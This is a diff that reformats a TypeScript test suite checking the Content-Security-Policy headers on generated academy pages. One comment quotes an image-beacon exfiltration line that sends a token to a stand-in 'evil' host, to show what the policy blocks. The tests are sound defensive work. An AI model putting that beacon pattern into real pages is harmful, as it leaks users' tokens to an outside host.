@@ -38,7 +38,11 @@ const PAGE = { academyId: 'a1', version: 3, html: '<!doctype html><html><body>hi
 /** `a; b; c` → { a: 'a …', b: '…' } keyed by directive name. */
 function directives(csp: string): Record<string, string> {
   return Object.fromEntries(
-    csp.split(';').map((d) => d.trim()).filter(Boolean).map((d) => [d.split(/\s+/)[0], d]),
+    csp
+      .split(';')
+      .map((d) => d.trim())
+      .filter(Boolean)
+      .map((d) => [d.split(/\s+/)[0], d]),
   );
 }
 
@@ -61,7 +65,9 @@ describe('generated academy pages carry a Content-Security-Policy', () => {
    * anywhere: fetch, XHR, WebSocket and sendBeacon are all governed by this.
    */
   it('confines fetch/XHR/WebSocket/beacon to this origin', () => {
-    expect(directives(headers['Content-Security-Policy'])['connect-src']).toBe("connect-src 'self'");
+    expect(directives(headers['Content-Security-Policy'])['connect-src']).toBe(
+      "connect-src 'self'",
+    );
   });
 
   /** The oldest exfiltration trick: new Image().src = 'https://evil/?t=' + token */
@@ -73,7 +79,9 @@ describe('generated academy pages carry a Content-Security-Policy', () => {
   });
 
   it('starts from default-src none, so anything unlisted is denied', () => {
-    expect(directives(headers['Content-Security-Policy'])['default-src']).toBe("default-src 'none'");
+    expect(directives(headers['Content-Security-Policy'])['default-src']).toBe(
+      "default-src 'none'",
+    );
   });
 
   it('forbids plugins, base-tag hijacking and off-origin form posts', () => {
@@ -84,7 +92,9 @@ describe('generated academy pages carry a Content-Security-Policy', () => {
   });
 
   it('only this app may frame the page', () => {
-    expect(directives(headers['Content-Security-Policy'])['frame-ancestors']).toBe("frame-ancestors 'self'");
+    expect(directives(headers['Content-Security-Policy'])['frame-ancestors']).toBe(
+      "frame-ancestors 'self'",
+    );
     expect(headers['X-Frame-Options']).toBe('SAMEORIGIN');
   });
 
@@ -95,7 +105,9 @@ describe('generated academy pages carry a Content-Security-Policy', () => {
    * built, not how they are served.
    */
   it('still permits the inline script the page is made of', () => {
-    expect(directives(headers['Content-Security-Policy'])['script-src']).toContain("'unsafe-inline'");
+    expect(directives(headers['Content-Security-Policy'])['script-src']).toContain(
+      "'unsafe-inline'",
+    );
   });
 
   it('keeps the fonts the template actually loads working', () => {
